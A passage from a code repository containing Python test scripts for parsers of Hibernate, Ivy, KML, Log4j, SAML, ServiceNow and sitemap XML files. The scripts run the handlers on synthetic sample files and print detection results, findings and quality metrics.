    print("=" * 50)
    
    success = test_graphml_handler()
    
    if success:
        print("\n🎉 All GraphML handler tests passed!")
        sys.exit(0)
    else:
        print("\n❌ Some GraphML handler tests failed!")
        sys.exit(1)
</file>

<file path="tests/unit/test_hibernate_handler.py">
#!/usr/bin/env python3
"""
Test script for Hibernate Handler
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from handlers.hibernate_handler import HibernateHandler
import xml.etree.ElementTree as ET

def test_hibernate_handler():
    """Test Hibernate handler with synthetic test files"""
    handler = HibernateHandler()
    
    # Test files
    test_files = [
        '../../sample_data/test_files_synthetic/small/hibernate/hibernate.cfg.xml',
        '../../sample_data/test_files_synthetic/small/hibernate/User.hbm.xml',
        '../../sample_data/test_files_synthetic/small/hibernate/Order.hbm.xml',
        '../../sample_data/test_files_synthetic/small/hibernate/Product.hbm.xml'
    ]
    
    print("🧪 Testing Hibernate Handler")
    print("=" * 50)
    
    results = []
    
    for file_path in test_files:
        print(f"\n📄 Testing: {file_path}")
        
        try:
            # Parse XML
            tree = ET.parse(file_path)
            root = tree.getroot()
            
            # Extract namespaces
            namespaces = {}
            for key, value in root.attrib.items():
                if key.startswith('xmlns'):
                    prefix = key.split(':', 1)[1] if ':' in key else 'default'
                    namespaces[prefix] = value
            
            # Test detection
            can_handle, confidence = handler.can_handle(root, namespaces)
            print(f"   Can handle: {can_handle} (confidence: {confidence:.2f})")
            
            if can_handle:
                # Test type detection
                doc_type = handler.detect_type(root, namespaces)
                print(f"   Type: {doc_type.type_name} (v{doc_type.version})")
                print(f"   File type: {doc_type.metadata.get('file_type')}")
                print(f"   Database driver: {doc_type.metadata.get('database_driver')}")
                print(f"   Entity count: {doc_type.metadata.get('entity_count')}")
                
                # Test analysis
                analysis = handler.analyze(root, file_path)
                print(f"   Analysis complete - {len(analysis.key_findings)} findings")
                
                # Show key findings based on file type
                hibernate_info = analysis.key_findings.get('hibernate_info', {})
                print(f"   Hibernate version: {hibernate_info.get('version')}")
                print(f"   File type: {hibernate_info.get('file_type')}")
                
                # Configuration-specific info
                if 'session_factory' in analysis.key_findings:
                    sf_info = analysis.key_findings['session_factory']
                    print(f"   Session factory: {sf_info['present']} (props: {sf_info['property_count']})")
                
                if 'database_info' in analysis.key_findings:
                    db_info = analysis.key_findings['database_info']
                    if db_info.get('driver'):
                        print(f"   Database: {db_info.get('driver', 'Unknown')}")
                
                # Mapping-specific info
                if 'entities' in analysis.key_findings:
                    entity_info = analysis.key_findings['entities']
                    print(f"   Entities: {entity_info['entity_count']}")
                    if entity_info['table_names']:
                        print(f"   Tables: {', '.join(entity_info['table_names'][:3])}")
                
                if 'relationships' in analysis.key_findings:
                    rel_info = analysis.key_findings['relationships']
                    print(f"   Relationships: {rel_info['relationship_count']}")
                
                # Security info
                if 'security' in analysis.key_findings:
                    security_info = analysis.key_findings['security']
                    if security_info.get('security_risks'):
                        print(f"   ⚠️  Security risks: {len(security_info['security_risks'])}")
                
                # Quality metrics
                quality = analysis.quality_metrics
                print(f"   Quality - Overall: {quality['overall']:.2f}, Security: {quality['security']:.2f}")
                
                results.append((file_path, True, doc_type.type_name))
            else:
                results.append((file_path, False, "Not handled"))
                
        except Exception as e:
            print(f"   ❌ Error: {e}")
            results.append((file_path, False, f"Error: {e}"))
    
    # Summary
    print(f"\n{'='*50}")
    print("📊 Hibernate Handler Test Results:")
    success_count = sum(1 for _, success, _ in results if success)
    print(f"Success rate: {success_count}/{len(results)} ({success_count/len(results)*100:.1f}%)")
    
    for file_path, success, type_name in results:
        status = "✅" if success else "❌"
        print(f"{status} {os.path.basename(file_path)}: {type_name}")
    
    return success_count == len(results)

if __name__ == "__main__":
    success = test_hibernate_handler()
    sys.exit(0 if success else 1)
</file>

<file path="tests/unit/test_ivy_handler.py">
#!/usr/bin/env python3
"""
Test script for Ivy Handler
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from handlers.ivy_handler import IvyHandler
import xml.etree.ElementTree as ET

def test_ivy_handler():
    """Test Ivy handler with synthetic test files"""
    handler = IvyHandler()
    
    # Test files
    test_files = [
        '../../sample_data/test_files_synthetic/small/ivy/ivy.xml',
        '../../sample_data/test_files_synthetic/small/ivy/ivysettings.xml', 
        '../../sample_data/test_files_synthetic/small/ivy/library-ivy.xml'
    ]
    
    print("🧪 Testing Ivy Handler")
    print("=" * 50)
    
    results = []
    
    for file_path in test_files:
        print(f"\n📄 Testing: {file_path}")
        
        try:
            # Parse XML
            tree = ET.parse(file_path)
            root = tree.getroot()
            
            # Extract namespaces
            namespaces = {}
            for key, value in root.attrib.items():
                if key.startswith('xmlns'):
                    prefix = key.split(':', 1)[1] if ':' in key else 'default'
                    namespaces[prefix] = value
            
            # Test detection
            can_handle, confidence = handler.can_handle(root, namespaces)
            print(f"   Can handle: {can_handle} (confidence: {confidence:.2f})")
            
            if can_handle:
                # Test type detection
                doc_type = handler.detect_type(root, namespaces)
                print(f"   Type: {doc_type.type_name} (v{doc_type.version})")
                print(f"   File type: {doc_type.metadata.get('file_type')}")
                print(f"   Module: {doc_type.metadata.get('module_organization')}/{doc_type.metadata.get('module_name')}")
                print(f"   Dependencies: {doc_type.metadata.get('dependency_count')}")
                print(f"   Publications: {doc_type.metadata.get('publication_count')}")
                
                # Test analysis
                analysis = handler.analyze(root, file_path)
                print(f"   Analysis complete - {len(analysis.key_findings)} findings")
                
                # Show key findings based on file type
                ivy_info = analysis.key_findings.get('ivy_info', {})
                print(f"   Ivy version: {ivy_info.get('version')}")
                print(f"   File type: {ivy_info.get('file_type')}")
                
                # Module-specific info
                if 'module_info' in analysis.key_findings:
                    module_info = analysis.key_findings['module_info']
                    if module_info.get('organisation'):
                        print(f"   Organization: {module_info['organisation']}")
                    if module_info.get('status'):
                        print(f"   Status: {module_info['status']}")
                
                if 'dependencies' in analysis.key_findings:
                    dep_info = analysis.key_findings['dependencies']
                    print(f"   Dependencies: {dep_info['dependency_count']}")
                    if dep_info['organizations']:
                        print(f"   Organizations: {', '.join(dep_info['organizations'][:3])}")
                
                if 'publications' in analysis.key_findings:
                    pub_info = analysis.key_findings['publications']
                    print(f"   Publications: {pub_info['publication_count']}")
                    if pub_info['artifact_types']:
                        print(f"   Artifact types: {', '.join(pub_info['artifact_types'].keys())}")
                
                if 'configurations' in analysis.key_findings:
                    config_info = analysis.key_findings['configurations']
                    print(f"   Configurations: {config_info['configuration_count']}")
                
                # Settings-specific info
                if 'resolvers' in analysis.key_findings:
                    resolver_info = analysis.key_findings['resolvers']
                    print(f"   Resolvers: {resolver_info['resolver_count']}")
                    if resolver_info['resolver_types']:
                        print(f"   Resolver types: {', '.join(resolver_info['resolver_types'].keys())}")
                
                # Security info
                if 'security' in analysis.key_findings:
                    security_info = analysis.key_findings['security']
                    if security_info.get('security_risks'):
                        print(f"   ⚠️  Security risks: {len(security_info['security_risks'])}")
                        for risk in security_info['security_risks'][:2]:  # Show first 2
                            print(f"      - {risk}")
                
                # Quality metrics
                quality = analysis.quality_metrics
                print(f"   Quality - Overall: {quality['overall']:.2f}, Security: {quality['security']:.2f}")
                
                results.append((file_path, True, doc_type.type_name))
            else:
                results.append((file_path, False, "Not handled"))
                
        except Exception as e:
            print(f"   ❌ Error: {e}")
            results.append((file_path, False, f"Error: {e}"))
    
    # Summary
    print(f"\n{'='*50}")
    print("📊 Ivy Handler Test Results:")
    success_count = sum(1 for _, success, _ in results if success)
    print(f"Success rate: {success_count}/{len(results)} ({success_count/len(results)*100:.1f}%)")
    
    for file_path, success, type_name in results:
        status = "✅" if success else "❌"
        print(f"{status} {os.path.basename(file_path)}: {type_name}")
    
    return success_count == len(results)

if __name__ == "__main__":
    success = test_ivy_handler()
    sys.exit(0 if success else 1)
</file>

<file path="tests/unit/test_kml_handler.py">
#!/usr/bin/env python3
"""
Test KML handler implementation
"""

import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_kml_handler_import():
    """Test importing the KML handler"""
    try:
        from handlers.kml_handler import KMLHandler
        print("✅ KMLHandler imported successfully")
        return True
    except ImportError as e:
        print(f"❌ Failed to import KMLHandler: {e}")
        return False

def test_kml_handler_instantiation():
    """Test creating KML handler instance"""
    try:
        from handlers.kml_handler import KMLHandler
        handler = KMLHandler()
        print("✅ KMLHandler instantiated successfully")
        return handler
    except Exception as e:
        print(f"❌ Failed to instantiate KMLHandler: {e}")
        return None

def test_kml_files():
    """Test KML handler with sample files"""
    from handlers.kml_handler import KMLHandler
    import xml.etree.ElementTree as ET
    
    handler = KMLHandler()
    test_files = [
        "../../sample_data/test_files_synthetic/small/kml/simple_placemark.kml",
        "../../sample_data/test_files_synthetic/small/kml/route_linestring.kml", 
        "../../sample_data/test_files_synthetic/small/kml/area_polygon.kml",
        "../../sample_data/test_files_synthetic/small/kml/complex_document.kml"
    ]
    
    results = []
    
    for test_file in test_files:
        if not Path(test_file).exists():
            print(f"❌ Test file not found: {test_file}")
            continue
            
        print(f"\n🔍 Testing {test_file}")
        
        try:
            # Parse XML
            tree = ET.parse(test_file)
            root = tree.getroot()
            
            # Extract namespaces
            namespaces = {}
            for event, elem in ET.iterparse(test_file, events=['start-ns']):
                if event == 'start-ns':
                    prefix, uri = elem
                    namespaces[prefix or 'default'] = uri
            
            # Test can_handle
            can_handle, confidence = handler.can_handle(root, namespaces)
            print(f"  - can_handle: {can_handle} (confidence: {confidence:.2f})")
            
            if can_handle:
                # Test detect_type
                doc_type = handler.detect_type(root, namespaces)
                print(f"  - Document type: {doc_type.type_name}")
                print(f"  - Version: {doc_type.version}")
                print(f"  - Confidence: {doc_type.confidence:.2f}")
                
                # Test analyze
                analysis = handler.analyze(root, test_file)
                print(f"  - Analysis type: {analysis.document_type}")
                print(f"  - Key findings keys: {list(analysis.key_findings.keys())}")
                print(f"  - Data inventory: {analysis.data_inventory}")
                print(f"  - AI use cases: {len(analysis.ai_use_cases)}")
                print(f"  - Quality metrics: {analysis.quality_metrics}")
                
                # Test extract_key_data
                key_data = handler.extract_key_data(root)
                print(f"  - Key data keys: {list(key_data.keys())}")
                
                results.append({
                    'file': test_file,
                    'success': True,
                    'confidence': confidence,
                    'features': analysis.data_inventory.get('total_features', 0)
                })
                print("  ✅ Test passed")
            else:
                results.append({
                    'file': test_file,
                    'success': False,
                    'reason': 'Handler rejected file'
                })
                print("  ❌ Handler cannot handle this file")
                
        except Exception as e:
            print(f"  ❌ Test failed: {e}")
            results.append({
                'file': test_file,
                'success': False,
                'reason': str(e)
            })
            import traceback
            traceback.print_exc()
    
    return results

def main():
    print("🧪 KML Handler Test Suite")
    print("=" * 50)
    
    # Test import
    if not test_kml_handler_import():
        return False
    
    # Test instantiation
    handler = test_kml_handler_instantiation()
    if not handler:
        return False
    
    # Test with files
    results = test_kml_files()
    
    # Summary
    print(f"\n📊 Test Results Summary")
    print("=" * 30)
    
    successful = [r for r in results if r['success']]
    failed = [r for r in results if not r['success']]
    
    print(f"✅ Successful: {len(successful)}/{len(results)}")
    print(f"❌ Failed: {len(failed)}/{len(results)}")
    
    if successful:
        avg_confidence = sum(r['confidence'] for r in successful) / len(successful)
        print(f"📈 Average confidence: {avg_confidence:.2f}")
        
        total_features = sum(r.get('features', 0) for r in successful)
        print(f"🗺️ Total features detected: {total_features}")
    
    if failed:
        print("\n❌ Failed tests:")
        for result in failed:
            print(f"  - {Path(result['file']).name}: {result['reason']}")
    
    success_rate = len(successful) / len(results) * 100 if results else 0
    print(f"\n🎯 Success rate: {success_rate:.1f}%")
    
    return success_rate == 100.0

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
</file>

<file path="tests/unit/test_log4j_handler.py">
#!/usr/bin/env python3
"""
Test script for Log4j Configuration Handler
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from handlers.log4j_config_handler import Log4jConfigHandler
import xml.etree.ElementTree as ET

def test_log4j_handler():
    """Test Log4j handler with synthetic test files"""
    handler = Log4jConfigHandler()
    
    # Test files
    test_files = [
        '../../sample_data/test_files_synthetic/small/log4j/log4j2.xml',
        '../../sample_data/test_files_synthetic/small/log4j/log4j.xml',
        '../../sample_data/test_files_synthetic/small/log4j/log4j2-vulnerable.xml'
    ]
    
    print("🧪 Testing Log4j Configuration Handler")
    print("=" * 55)
    
    results = []
    
    for file_path in test_files:
        print(f"\n📄 Testing: {file_path}")
        
        try:
            # Parse XML
            tree = ET.parse(file_path)
            root = tree.getroot()
            
            # Extract namespaces
            namespaces = {}
            for key, value in root.attrib.items():
                if key.startswith('xmlns'):
                    prefix = key.split(':', 1)[1] if ':' in key else 'default'
                    namespaces[prefix] = value
            
            # Test detection
            can_handle, confidence = handler.can_handle(root, namespaces)
            print(f"   Can handle: {can_handle} (confidence: {confidence:.2f})")
            
            if can_handle:
                # Test type detection
                doc_type = handler.detect_type(root, namespaces)
                print(f"   Type: {doc_type.type_name} (v{doc_type.version})")
                print(f"   Framework: {doc_type.metadata.get('framework')}")
                print(f"   Appenders: {doc_type.metadata.get('appender_count')}")
                print(f"   Loggers: {doc_type.metadata.get('logger_count')}")
                print(f"   Security issues: {doc_type.metadata.get('has_security_issues')}")
                
                # Test analysis
                analysis = handler.analyze(root, file_path)
                print(f"   Analysis complete - {len(analysis.key_findings)} findings")
                
                # Show key findings
                log4j_info = analysis.key_findings.get('log4j_info', {})
                print(f"   Log4j version: {log4j_info.get('version')}")
                
                appender_info = analysis.key_findings.get('appenders', {})
                print(f"   Appenders: {appender_info.get('appender_count')} total")
                if appender_info.get('appender_types'):
                    print(f"   Appender types: {', '.join(appender_info['appender_types'].keys())}")
                
                logger_info = analysis.key_findings.get('loggers', {})
                print(f"   Loggers: {logger_info.get('logger_count')} total")
                if logger_info.get('level_distribution'):
                    levels = ', '.join(f"{k}:{v}" for k,v in logger_info['level_distribution'].items())
                    print(f"   Log levels: {levels}")
                
                # Security analysis
                security_info = analysis.key_findings.get('security_concerns', {})
                if security_info.get('security_risks'):
                    print(f"   🚨 Security risks: {len(security_info['security_risks'])}")
                    for risk in security_info['security_risks'][:2]:  # Show first 2
                        print(f"      - {risk}")
                
                if security_info.get('log4shell_vulnerable'):
                    print(f"   ⚠️  Log4Shell VULNERABILITY detected!")
                
                # Performance analysis
                performance_info = analysis.key_findings.get('performance', {})
                if performance_info.get('performance_risks'):
                    print(f"   ⚡ Performance risks: {len(performance_info['performance_risks'])}")
                
                # Quality metrics
                quality = analysis.quality_metrics
                print(f"   Quality - Overall: {quality['overall']:.2f}, Security: {quality['security']:.2f}")
                
                results.append((file_path, True, doc_type.type_name))
            else:
                results.append((file_path, False, "Not handled"))
                
        except Exception as e:
            print(f"   ❌ Error: {e}")
            results.append((file_path, False, f"Error: {e}"))
    
    # Summary
    print(f"\n{'='*55}")
    print("📊 Log4j Handler Test Results:")
    success_count = sum(1 for _, success, _ in results if success)
    print(f"Success rate: {success_count}/{len(results)} ({success_count/len(results)*100:.1f}%)")
    
    for file_path, success, type_name in results:
        status = "✅" if success else "❌"
        print(f"{status} {os.path.basename(file_path)}: {type_name}")
    
    return success_count == len(results)

if __name__ == "__main__":
    success = test_log4j_handler()
    sys.exit(0 if success else 1)
</file>

<file path="tests/unit/test_saml_handler.py">
#!/usr/bin/env python3
"""
Test script for SAML Handler
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from handlers.saml_handler import SAMLHandler
import xml.etree.ElementTree as ET

def test_saml_handler():
    """Test SAML handler with synthetic test files"""
    handler = SAMLHandler()
    
    # Test files
    test_files = [
        '../../sample_data/test_files_synthetic/small/saml/saml_assertion.xml',
        '../../sample_data/test_files_synthetic/small/saml/saml_response.xml',
        '../../sample_data/test_files_synthetic/small/saml/saml_authn_request.xml',
        '../../sample_data/test_files_synthetic/small/saml/saml_logout_request.xml'
    ]
    
    print("🧪 Testing SAML Handler")
    print("=" * 50)
    
    results = []
    
    for file_path in test_files:
        print(f"\n📄 Testing: {file_path}")
        
        try:
            # Parse XML
            tree = ET.parse(file_path)
            root = tree.getroot()
            
            # Extract namespaces
            namespaces = {}
            for key, value in root.attrib.items():
                if key.startswith('xmlns'):
                    prefix = key.split(':', 1)[1] if ':' in key else 'default'
                    namespaces[prefix] = value
            
            # Test detection
            can_handle, confidence = handler.can_handle(root, namespaces)
            print(f"   Can handle: {can_handle} (confidence: {confidence:.2f})")
            
            if can_handle:
                # Test type detection
                doc_type = handler.detect_type(root, namespaces)
                print(f"   Type: {doc_type.type_name} (v{doc_type.version})")
                print(f"   Message type: {doc_type.metadata.get('message_type')}")
                print(f"   Issuer: {doc_type.metadata.get('issuer')}")
                print(f"   Has signature: {doc_type.metadata.get('has_signature')}")
                print(f"   Has encryption: {doc_type.metadata.get('has_encryption')}")
                
                # Test analysis
                analysis = handler.analyze(root, file_path)
                print(f"   Analysis complete - {len(analysis.key_findings)} findings")
                
                # Show key findings
                saml_info = analysis.key_findings['saml_info']
                print(f"   SAML version: {saml_info['version']}")
                print(f"   Message type: {saml_info['message_type']}")
                print(f"   ID: {saml_info['id']}")
                
                # Security info
                security_info = analysis.key_findings['security']
                if security_info['security_risks']:
                    print(f"   ⚠️  Security risks: {security_info['security_risks']}")
                
                # Subject info
                subject_info = analysis.key_findings['subject_info']
                if subject_info['has_subject']:
                    print(f"   Subject: {subject_info['name_id']} ({subject_info['name_id_format']})")
                
                # Assertion info  
                assertion_info = analysis.key_findings['assertions']
                if assertion_info['assertion_count'] > 0:
                    print(f"   Assertions: {assertion_info['assertion_count']} (encrypted: {assertion_info['encrypted_assertions']})")
                
                # Attribute info
                attr_info = analysis.key_findings['attributes']
                if attr_info['total_attributes'] > 0:
                    print(f"   Attributes: {attr_info['total_attributes']} total")
                
                # Quality metrics
                quality = analysis.quality_metrics
                print(f"   Quality - Overall: {quality['overall']:.2f}, Security: {quality['security']:.2f}")
                
                results.append((file_path, True, doc_type.type_name))
            else:
                results.append((file_path, False, "Not handled"))
                
        except Exception as e:
            print(f"   ❌ Error: {e}")
            results.append((file_path, False, f"Error: {e}"))
    
    # Summary
    print(f"\n{'='*50}")
    print("📊 SAML Handler Test Results:")
    success_count = sum(1 for _, success, _ in results if success)
    print(f"Success rate: {success_count}/{len(results)} ({success_count/len(results)*100:.1f}%)")
    
    for file_path, success, type_name in results:
        status = "✅" if success else "❌"
        print(f"{status} {os.path.basename(file_path)}: {type_name}")
    
    return success_count == len(results)

if __name__ == "__main__":
    success = test_saml_handler()
    sys.exit(0 if success else 1)
</file>

<file path="tests/unit/test_servicenow_handler.py">
#!/usr/bin/env python3
"""
Unit tests for ServiceNow XML Handler

Tests the ServiceNowHandler's ability to process ServiceNow export files
containing incidents, problems, changes, and related data.
"""

import unittest
import xml.etree.ElementTree as ET
from pathlib import Path
import sys
import os

# Add parent directories to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from src.handlers.servicenow_handler import ServiceNowHandler


class TestServiceNowHandler(unittest.TestCase):
    """Test cases for ServiceNowHandler"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.handler = ServiceNowHandler()
        
        # Create a sample ServiceNow XML structure
        self.sample_xml = """<?xml version="1.0" ?>
<unload>
  <incident action="INSERT_OR_UPDATE">
    <number>INC0001234</number>
    <sys_id>abc123def456</sys_id>
    <opened_at>2023-04-18 19:06:09</opened_at>
    <closed_at>2023-12-21 20:00:02</closed_at>
    <resolved_at>2023-12-14 19:52:00</resolved_at>
    <state>7</state>
    <u_state_text>Closed</u_state_text>
    <priority>4</priority>
    <impact>3</impact>
    <urgency>3</urgency>
    <category>software</category>
    <subcategory/>
    <short_description>X-window session errors</short_description>
    <description>Daily x-window session errors out, works for a day or so, but consistently fails.</description>
    <assignment_group display_value="IT Support Group">UUID2</assignment_group>
    <assigned_to display_value="John Smith">UUID5</assigned_to>
    <caller_id display_value="Jane Doe">UUID6</caller_id>
    <requested_for display_value="Jane Doe">UUID6</requested_for>
    <opened_by display_value="John Smith">UUID5</opened_by>
    <resolved_by display_value="John Smith">UUID5</resolved_by>
    <closed_by display_value="John Smith">UUID5</closed_by>
    <close_code>Solved</close_code>
    <close_notes>Issue resolved</close_notes>
    <made_sla>true</made_sla>
    <u_sla_percentage>857.26</u_sla_percentage>
    <u_breach_time>2023-05-16 19:06:09</u_breach_time>
    <reassignment_count>2</reassignment_count>
    <reopen_count>0</reopen_count>
    <u_escalation_level>4_sla_breached</u_escalation_level>
    <u_custom_field>Custom value</u_custom_field>
  </incident>
  <sys_journal_field action="INSERT_OR_UPDATE">
    <element>comments</element>
    <element_id>abc123def456</element_id>
    <name>incident</name>
    <sys_created_by>john.smith</sys_created_by>
    <sys_created_on>2023-12-14 19:52:00</sys_created_on>
    <sys_id>journal123</sys_id>
    <value>Thank you for contacting the LC hotline.</value>
  </sys_journal_field>
  <sys_journal_field action="INSERT_OR_UPDATE">
    <element>work_notes</element>
    <element_id>abc123def456</element_id>
    <name>incident</name>
    <sys_created_by>john.smith</sys_created_by>
    <sys_created_on>2023-04-18 19:06:09</sys_created_on>
    <sys_id>journal456</sys_id>
    <value>This Incident was raised on behalf of Jane Doe</value>
  </sys_journal_field>
  <sys_attachment action="INSERT_OR_UPDATE">
    <file_name>screenshot.png</file_name>
    <content_type>image/png</content_type>
    <size_bytes>2193</size_bytes>
    <sys_created_by>jane.doe</sys_created_by>
    <sys_created_on>2023-05-05 23:15:01</sys_created_on>
    <sys_id>attach123</sys_id>
  </sys_attachment>
</unload>"""
        
        self.root = ET.fromstring(self.sample_xml)
        self.namespaces = {}
    
    def test_can_handle(self):
        """Test document type detection"""
        can_handle, confidence = self.handler.can_handle(self.root, self.namespaces)
        
        self.assertTrue(can_handle)
        self.assertGreater(confidence, 0.7)
    
    def test_detect_type(self):
        """Test ServiceNow type detection"""
        type_info = self.handler.detect_type(self.root, self.namespaces)
        
        self.assertEqual(type_info.type_name, "ServiceNow Incident")
        self.assertGreater(type_info.confidence, 0.9)
        self.assertEqual(type_info.metadata['primary_record_type'], 'incident')
        self.assertTrue(type_info.metadata['has_journal_entries'])
        self.assertTrue(type_info.metadata['has_attachments'])
    
    def test_extract_key_data(self):
        """Test key data extraction"""
        data = self.handler.extract_key_data(self.root)
        
        # Test ticket info extraction
        self.assertIn('ticket_info', data)
        ticket_info = data['ticket_info']
        self.assertEqual(ticket_info['number'], 'INC0001234')
        self.assertEqual(ticket_info['sys_id'], 'abc123def456')
        self.assertEqual(ticket_info['state'], '7')
        self.assertEqual(ticket_info['state_text'], 'Closed')
        
        # Test conversation thread extraction
        self.assertIn('conversation_thread', data)
        thread = data['conversation_thread']
        self.assertEqual(len(thread), 2)  # One comment, one work note
        
        # Test attachment extraction
        self.assertIn('attachments', data)
        attachments = data['attachments']
        self.assertEqual(len(attachments), 1)
        self.assertEqual(attachments[0]['file_name'], 'screenshot.png')
        
        # Test timeline extraction
        self.assertIn('timeline', data)
        timeline = data['timeline']
        self.assertGreater(len(timeline), 0)
        
        # Test people extraction
        self.assertIn('people_involved', data)
        people = data['people_involved']
        self.assertIn('Jane Doe', people['requesters'])
        self.assertIn('John Smith', people['assignees'])
    
    def test_analyze(self):
        """Test comprehensive analysis"""
        analysis = self.handler.analyze(self.root, 'test.xml')
        
        # Check findings
        self.assertIn('record_type', analysis.key_findings)
        self.assertEqual(analysis.key_findings['record_type'], 'incident')
        self.assertEqual(analysis.key_findings['priority'], '4')
        self.assertEqual(analysis.key_findings['close_code'], 'Solved')
        
        # Check journal analysis
        self.assertIn('journal_analysis', analysis.key_findings)
        journal = analysis.key_findings['journal_analysis']
        self.assertEqual(journal['total_entries'], 2)
        self.assertEqual(journal['comments_count'], 1)
        self.assertEqual(journal['work_notes_count'], 1)
        
        # Check attachment analysis
        self.assertIn('attachment_analysis', analysis.key_findings)
        attachments = analysis.key_findings['attachment_analysis']
        self.assertEqual(attachments['total_attachments'], 1)
        self.assertIn('image/png', attachments['attachment_types'])
        
        # Check SLA metrics
        self.assertIn('sla_metrics', analysis.key_findings)
        sla = analysis.key_findings['sla_metrics']
        self.assertTrue(sla['made_sla'])
        self.assertEqual(sla['sla_percentage'], '857.26')
        
        # Check workflow analysis
        self.assertIn('workflow_analysis', analysis.key_findings)
        workflow = analysis.key_findings['workflow_analysis']
        self.assertEqual(workflow['reassignment_count'], '2')
        self.assertEqual(workflow['reopen_count'], '0')
        
        # Check recommendations
        self.assertIsInstance(analysis.recommendations, list)
        self.assertGreater(len(analysis.recommendations), 0)
        
        # Check AI use cases
        self.assertIsInstance(analysis.ai_use_cases, list)
        self.assertGreater(len(analysis.ai_use_cases), 5)
    
    def test_custom_fields_extraction(self):
        """Test extraction of custom fields (u_ prefix)"""
        incident = self.root.find('.//incident')
        custom_fields = self.handler._extract_custom_fields(incident)
        
        self.assertIn('u_state_text', custom_fields)
        self.assertIn('u_sla_percentage', custom_fields)
        self.assertIn('u_custom_field', custom_fields)
        self.assertEqual(custom_fields['u_custom_field'], 'Custom value')
    
    def test_minimal_servicenow_xml(self):
        """Test handling of minimal ServiceNow XML"""
        minimal_xml = """<?xml version="1.0" ?>
<unload>
  <incident action="INSERT_OR_UPDATE">
    <number>INC0001234</number>
    <short_description>Test incident</short_description>
    <state>1</state>
  </incident>
</unload>"""
        
        root = ET.fromstring(minimal_xml)
        can_handle, confidence = self.handler.can_handle(root, {})
        
        self.assertTrue(can_handle)
        self.assertGreater(confidence, 0.5)
        
        # Should still analyze without errors
        analysis = self.handler.analyze(root, 'minimal.xml')
        self.assertIsNotNone(analysis)
    
    def test_problem_record_type(self):
        """Test handling of problem records"""
        problem_xml = """<?xml version="1.0" ?>
<unload>
  <problem action="INSERT_OR_UPDATE">
    <number>PRB0001234</number>
    <short_description>Test problem</short_description>
    <state>1</state>
  </problem>
</unload>"""
        
        root = ET.fromstring(problem_xml)
        type_info = self.handler.detect_type(root, {})
        
        self.assertEqual(type_info.type_name, "ServiceNow Problem")
        self.assertEqual(type_info.metadata['primary_record_type'], 'problem')
    
    def test_quality_metrics(self):
        """Test quality metrics calculation"""
        metrics = self.handler._calculate_quality_metrics(self.root)
        
        self.assertIn('completeness', metrics)
        self.assertIn('consistency', metrics)
        self.assertIn('richness', metrics)
        
        # With our sample data, should have good completeness
        self.assertGreater(metrics['completeness'], 0.8)
        self.assertGreater(metrics['consistency'], 0.5)
        self.assertGreater(metrics['richness'], 0.1)


if __name__ == '__main__':
    unittest.main()
</file>

<file path="tests/unit/test_sitemap_handler.py">
#!/usr/bin/env python3
"""
Test script for Sitemap Handler
Tests the Sitemap handler against synthetic test files.
"""

import sys
import os
import xml.etree.ElementTree as ET
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

# Test individual handler
try:
    from handlers.sitemap_handler import SitemapHandler
    print("✅ SitemapHandler imported successfully")
except ImportError as e:
    print(f"❌ Failed to import SitemapHandler: {e}")
    sys.exit(1)

def test_handler():
    """Test the Sitemap handler with synthetic files"""
    
    handler = SitemapHandler()
    test_files_dir = Path("../../sample_data/test_files_synthetic/small/sitemap")
    
    if not test_files_dir.exists():
        print(f"❌ Test files directory not found: {test_files_dir}")
        return False
    
    sitemap_files = list(test_files_dir.glob("*.xml"))
    if not sitemap_files:
        print(f"❌ No Sitemap files found in {test_files_dir}")
        return False
    
    print(f"\n🔍 Testing Sitemap handler with {len(sitemap_files)} files...")
    
    success_count = 0
    total_count = len(sitemap_files)
    
    for sitemap_file in sitemap_files:
        print(f"\n📄 Testing: {sitemap_file.name}")
        
        try:
            # Parse the XML file
            tree = ET.parse(sitemap_file)
            root = tree.getroot()
            
            # Extract namespaces
            namespaces = {}
            for key, value in root.attrib.items():
                if key.startswith('xmlns'):
                    prefix = key.split(':')[1] if ':' in key else 'default'
                    namespaces[prefix] = value
            
            # Test can_handle
            can_handle, confidence = handler.can_handle(root, namespaces)
            print(f"  ✓ can_handle: {can_handle} (confidence: {confidence:.1f})")
            
            if not can_handle:
                print(f"  ❌ Handler cannot handle this file")
                continue
            
            # Test detect_type
            doc_type = handler.detect_type(root, namespaces)
            print(f"  ✓ detect_type: {doc_type.type_name} (v{doc_type.version})")
            print(f"    - Sitemap type: {doc_type.metadata.get('sitemap_type', 'unknown')}")
            
            # Test extract_key_data
            key_data = handler.extract_key_data(root)
            print(f"  ✓ extract_key_data: {len(key_data)} sections")
            
            # Test full analysis
            analysis = handler.analyze(root, str(sitemap_file))
            print(f"  ✓ analyze: {analysis.document_type}")
            print(f"    - Key findings: {len(analysis.key_findings)} sections")
            print(f"    - Recommendations: {len(analysis.recommendations)} items")
            print(f"    - AI use cases: {len(analysis.ai_use_cases)} cases")
            print(f"    - Data inventory: {sum(analysis.data_inventory.values())} items")
            print(f"    - Quality score: {analysis.quality_metrics.get('overall', 0):.2f}")
            
            # Test specific Sitemap analysis
            sitemap_info = analysis.key_findings.get('sitemap_info', {})
            print(f"    - Sitemap type: {sitemap_info.get('type', 'Unknown')}")
            
            content_analysis = analysis.key_findings.get('content_analysis', {})
            if 'url_count' in content_analysis:
                print(f"    - URLs found: {content_analysis.get('url_count', 0)}")
                
                priorities = content_analysis.get('priorities', {})
                print(f"    - Priority values: {len(priorities)} different")
                
                changefreqs = content_analysis.get('change_frequencies', {})
                print(f"    - Change frequencies: {len(changefreqs)} different")
                
                lastmod = content_analysis.get('last_modified', {})
                print(f"    - URLs with lastmod: {lastmod.get('count', 0)}")
            
            if 'sitemap_count' in content_analysis:
                print(f"    - Sitemaps in index: {content_analysis.get('sitemap_count', 0)}")
            
            seo_analysis = analysis.key_findings.get('seo_analysis', {})
            if 'priority_distribution' in seo_analysis:
                priority_dist = seo_analysis['priority_distribution']
